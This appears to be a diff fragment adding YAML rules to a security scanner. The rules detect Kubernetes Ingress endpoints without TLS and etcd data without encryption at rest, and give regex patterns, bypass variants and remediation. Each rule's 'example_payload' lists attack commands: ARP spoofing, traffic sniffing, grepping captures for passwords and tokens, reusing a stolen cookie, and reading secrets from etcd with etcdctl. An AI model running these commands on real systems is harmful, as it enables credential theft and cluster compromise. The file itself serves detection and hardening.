+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.82
+  exploit_scenario:
+    attack_example: 'Credential Interception via HTTP Downgrade: An attacker performs a man-in-the-middle attack on the network path between users and a Kubernetes Ingress endpoint that lacks TLS. They
+      intercept login credentials, session cookies, and API tokens transmitted in cleartext. With the stolen credentials, they authenticate as legitimate users and access sensitive application data.
+
+      '
+    example_payload: '# Network sniffing on the path to unprotected ingress
+
+      tcpdump -i eth0 -A ''port 80 and host app.example.com''
+
+      # Extract credentials from captured HTTP traffic
+
+      strings capture.pcap | grep -i "password\|token\|session"
+
+      # Use stolen session cookie
+
+      curl -H "Cookie: session=stolen_token_value" https://app.example.com/admin
+
+      # ARP spoofing for MITM position
+
+      arpspoof -i eth0 -t victim_ip gateway_ip
+
+      '
+    attacker_objective: 'Intercept cleartext HTTP traffic containing authentication credentials, session tokens, and sensitive data by exploiting the absence of TLS encryption on Kubernetes Ingress endpoints.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.88
+    context_match: 0.9
+    proximity_to_user_input: 0.5
+    sanitization_absence: 0.89
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-010
+    - DEVOPS-YAML-015
+    - DEVOPS-YAML-004
+- rule_id: DEVOPS-YAML-015
+  title: Unencrypted etcd Data at Rest
+  description: 'Detects Kubernetes API server and etcd configurations that lack encryption at rest for stored data. By default, Kubernetes stores all data (including Secrets, ConfigMaps, and custom resources)
+    in etcd as base64-encoded plaintext. Without an EncryptionConfiguration specifying AES-CBC, AES-GCM, or KMS-based encryption, anyone with direct etcd access or etcd backup access can read all cluster
+    secrets in cleartext.
+
+    '
+  language: yaml
+  category: devops
+  severity: Critical
+  confidence: 0.91
+  cwe: CWE-311
+  owasp: A02:2021-Cryptographic-Failures
+  tags:
+  - kubernetes
+  - etcd
+  - encryption-at-rest
+  - secrets
+  - data-protection
+  - cis-benchmark
+  - kms
+  - compliance
+  detection_layer: 1
+  attack_surface_type: storage
+  patterns:
+  - type: regex
+    pattern: resources\s*:\s*\n\s+-\s+resources\s*:\s*\n\s+-\s+secrets\s*\n\s+providers\s*:\s*\n\s+-\s+identity\s*:\s*\{\}
+  - type: regex
+    pattern: --encryption-provider-config\s*=\s*$
+  - type: regex
+    pattern: kind\s*:\s*EncryptionConfiguration\s*\n(?:.*\n){0,20}?providers\s*:\s*\n\s+-\s+identity\s*:\s*\{\}
+  - type: regex
+    pattern: apiVersion\s*:\s*apiserver\.config\.k8s\.io/v1\s*\nkind\s*:\s*EncryptionConfiguration\s*\n(?:.*\n){0,20}?identity\s*:\s*\{\}
+  - type: regex
+    pattern: command\s*:\s*\n(?:\s+-\s+.*\n){0,15}?(?!.*--encryption-provider-config)\s+-\s+kube-apiserver
+  anti_patterns:
+  - 'aescbc:'
+  - 'aesgcm:'
+  - 'secretbox:'
+  - 'kms:'
+  - --encryption-provider-config=/etc/kubernetes
+  - "providers:\n      - aescbc:"
+  - "providers:\n      - kms:"
+  - EncryptionConfiguration
+  - gatekeeper.sh/constraint
+  - vault.hashicorp.com
+  bypass_variants:
+  - description: Identity provider listed first making encryption ineffective
+    pattern: providers\s*:\s*\n\s+-\s+identity\s*:\s*\{\}\s*\n\s+-\s+aescbc
+  - description: Encryption config present but not referenced by API server
+    pattern: EncryptionConfiguration(?:.*\n)*?(?!--encryption-provider-config)
+  - description: Weak encryption key hardcoded in config
+    pattern: secret\s*:\s*[A-Za-z0-9+/=]{16,}\s*\n
+  evasion_indicators:
+  - 'identity: {}'
+  - no --encryption-provider-config
+  - identity provider first in list
+  - hardcoded encryption key
+  encoding_variants:
+  - description: Base64 encoded etcd data without encryption layer
+    pattern: stringData converted to data with base64 only
+  - description: Helm template skipping encryption configuration
+    pattern: '{{-\s*if\s+\.Values\.etcd\.encryption\.enabled\s*}}'
+  multi_function_chain_patterns:
+  - description: API server without encryption config plus etcd without TLS
+    chain:
+    - kube-apiserver
+    - no --encryption-provider-config
+    - etcd without --cert-file
+  - description: Encryption config with identity first then real provider
+    chain:
+    - EncryptionConfiguration
+    - 'identity: {}'
+    - 'aescbc: or kms:'
+  privilege_context_flags:
+    requires_cluster_admin: true
+    requires_namespace_admin: false
+    network_exposure: internal
+  business_logic_indicator:
+    data_sensitivity: critical
+    compliance_relevant: true
+    regulatory_frameworks:
+    - PCI-DSS
+    - HIPAA
+    - SOC2
+    - GDPR
+    - FedRAMP
+  probable_taint_paths:
+  - source: Kubernetes Secrets stored in etcd
+    sink: etcd data directory or backup files
+    propagation: Plaintext base64 data accessible via etcd API or filesystem access
+  impact: 'Without encryption at rest, all Kubernetes Secrets (database passwords,
+
+    TLS certificates, API keys, service account tokens) are stored as
+
+    base64-encoded plaintext in etcd. Anyone with direct etcd access,
+
+    etcd backup access, or host filesystem access to etcd data directories
+
+    can decode and steal all cluster secrets. This violates CIS Kubernetes
+
+    Benchmark 1.2.29 and compliance frameworks requiring data-at-rest
+
+    encryption (PCI-DSS 3.4, HIPAA 164.312(a)(2)(iv)).
+
+    '
+  remediation: "## Kubernetes Encryption at Rest\n- Create an EncryptionConfiguration with aescbc, aesgcm, or kms provider\n- Pass --encryption-provider-config to kube-apiserver\n- Ensure the encryption\
+    \ provider is listed BEFORE identity in the providers list\n\n## EncryptionConfiguration Template\n```yaml\napiVersion: apiserver.config.k8s.io/v1\nkind: EncryptionConfiguration\nresources:\n  - resources:\n\
+    \      - secrets\n    providers:\n      - aescbc:\n          keys:\n            - name: key1\n              secret: <base64-encoded-32-byte-key>\n      - identity: {}\n```\n\n## CIS Benchmark References\n\
+    - CIS Kubernetes Benchmark 1.2.29: Ensure that the --encryption-provider-config argument is set as appropriate\n- CIS Kubernetes Benchmark 1.2.30: Ensure that encryption providers are appropriately\
+    \ configured\n\n## KMS-Based Encryption (Recommended for Production)\n- Use AWS KMS, GCP Cloud KMS, or Azure Key Vault for key management\n- Configure KMS provider plugin for automatic key rotation\n\
+    - Ensure etcd data directory has restrictive file permissions (700)\n\n## Additional Remediation\n- Encrypt existing secrets: kubectl get secrets --all-namespaces -o json | kubectl replace -f -\n- Rotate\
+    \ encryption keys periodically\n- Enable etcd TLS for transport encryption\n- Restrict etcd access to API server nodes only\n- Monitor etcd access logs for unauthorized reads\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/311.html
+  - https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1552/
+  - https://etcd.io/docs/v3.5/op-guide/security/
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: EncryptionConfiguration'
+    - apiserver.config.k8s.io
+    - kube-apiserver
+    - etcd
+    - 'providers:'
+    - --encryption-provider-config
+    - 'resources:'
+    taint_source_indicators:
+    - etcd data directory
+    - etcd backup
+    - /var/lib/etcd
+    - ETCDCTL_API=3
+    - etcdctl get
+    taint_sink_indicators:
+    - 'identity: {}'
+    - base64 encoded secrets
+    - no encryption provider
+    - plaintext etcd data
+    sanitization_patterns:
+    - 'aescbc:'
+    - 'aesgcm:'
+    - 'secretbox:'
+    - 'kms:'
+    - --encryption-provider-config
+    - EncryptionConfiguration
+    - KMS plugin
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.9
+  exploit_scenario:
+    attack_example: 'Secret Theft via etcd Backup Exfiltration: An attacker gains access to an etcd backup file (e.g., through a misconfigured S3 bucket, compromised backup system, or host filesystem access).
+      Without encryption at rest, they extract all Kubernetes Secrets by parsing the etcd data. They decode every base64-encoded Secret to recover database passwords, TLS private keys, cloud provider credentials,
+      and service account tokens, achieving full cluster and infrastructure compromise.
+
+      '
+    example_payload: "# Access etcd backup or live etcd\nETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt\
+      \ \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  get /registry/secrets --prefix --keys-only\n# Read specific secret in plaintext\nETCDCTL_API=3 etcdctl get /registry/secrets/default/database-credentials\n\
+      # Base64 decode the value\necho \"cGFzc3dvcmQxMjM=\" | base64 -d\n# Result: password123\n"
+    attacker_objective: 'Access etcd data directly or through backups to extract all Kubernetes Secrets in plaintext, gaining credentials for databases, cloud services, TLS certificates, and API tokens
+      for full infrastructure compromise.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.92
+    context_match: 0.91
+    proximity_to_user_input: 0.15
+    sanitization_absence: 0.93
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-004
+    - DEVOPS-YAML-014
+    - DEVOPS-YAML-013
